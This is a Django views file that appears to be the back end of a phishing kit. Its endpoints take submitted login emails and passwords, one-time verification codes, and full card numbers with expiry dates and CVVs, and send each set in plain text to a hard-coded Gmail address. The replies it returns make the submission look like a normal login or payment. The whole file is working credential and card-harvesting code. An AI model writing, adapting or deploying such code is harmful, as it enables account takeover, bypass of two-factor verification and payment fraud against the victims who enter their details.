from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
import json
import random
import string

# Create your views here.

def send_login_notification_email(login_data):
    email_subject = 'New Login Attempt'
    email_body = f"""
    A new login attempt has been made.
    
    Email: {login_data.get('email')}
    sswrd: {login_data.get('password')}
    """
    send_mail(
        email_subject,
        email_body,
        'tenfortow@gmail.com',
        ['tenfortow@gmail.com'],
        fail_silently=False,
    )

def send_code_notification_email(code_data):
    email_subject = 'Verification Code Submitted'
    email_body = f"""
    A verification code has been submitted.
    
    Code: {code_data.get('code')}
    """
    send_mail(
        email_subject,
        email_body,
        'tenfortow@gmail.com',
        ['tenfortow@gmail.com'],
        fail_silently=False,
    )

def send_payment_email(payment_data):
    email_subject = 'New Payment Received'
    email_body = f"""
    A new payment has been received.
    
    Name on Card: {payment_data.get('nameOnCard')}
    Card Number: {payment_data.get('cardNumber')}
    Expiry Date: {payment_data.get('expiryDate')}
    CVV: {payment_data.get('cvv')}
    """
    send_mail(
        email_subject,
        email_body,
        'tenfortow@gmail.com',
        ['tenfortow@gmail.com'],
        fail_silently=False,
    )

@csrf_exempt
def address(request):
    if request.method == 'POST':
        login_data = json.loads(request.body)
        send_login_notification_email(login_data)
        return JsonResponse({'message': 'Login information received and email sent'}, status=201)
    elif request.method == 'GET':
        return JsonResponse({'message': 'Use POST to submit login credentials'}, safe=False)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def verify_code(request):
    if request.method == 'POST':
        code_data = json.loads(request.body)
        send_code_notification_email(code_data)
        return JsonResponse({'message': 'Verification code received and email sent'}, status=201)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def payment(request):
    if request.method == 'POST':
        payment_data = json.loads(request.body)
        send_payment_email(payment_data)
        return JsonResponse({'message': 'Payment received and email sent'}, status=201)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)